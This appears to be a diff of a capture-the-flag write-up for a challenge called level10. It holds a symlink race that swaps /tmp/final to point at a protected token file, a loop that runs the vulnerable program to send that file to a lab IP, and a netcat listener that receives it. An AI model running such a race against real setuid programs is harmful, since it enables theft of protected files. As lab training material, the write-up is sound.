@@ -28,23 +28,8 @@ So we can do the symlink again and again, hoping that level10 will accept our fi
 
 # Solution
 
-Level10 seems to be able to sends any file we create so let's do on a first terminal connected with ssh: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done` to create the file that is going to be the symlink.
+Level10 seems to be able to sends any file we create so let's do on a first terminal connected with ssh: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done` to create the file that is going to be the symlink. (`readlink -f token` to know the true path of token file). We need to suppress and create a new file each time or the symlink will apply on tmp/final and will not pass the access() check again.
 
 On a second ssh terminal let's do: `while true; do (./level10 /tmp/final 10.11.200.134); done` to execute level10 in a loop.
 
 On a third terminal, we can listen to the port 6969 with the netcat command: `while true; do nc -l 6969 ;done`
-
-
-
-# brouillon
-
-
-First ssh terminal: `while true; do (./level10 /tmp/final 10.11.200.134); done`
-
-Second ssh terminal: `while true; do nc -l 6969 ;done`
-
-`readlink -f token` to know true token path
-
-third ssh terminal: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done`
-
-If you don't rm and touch /tmp/final the symlink is on put final and you ./level10 will say you don't have access to /tmp/final, you need a new file created by you to pass the access() check and then apply symlink to /tmp/final
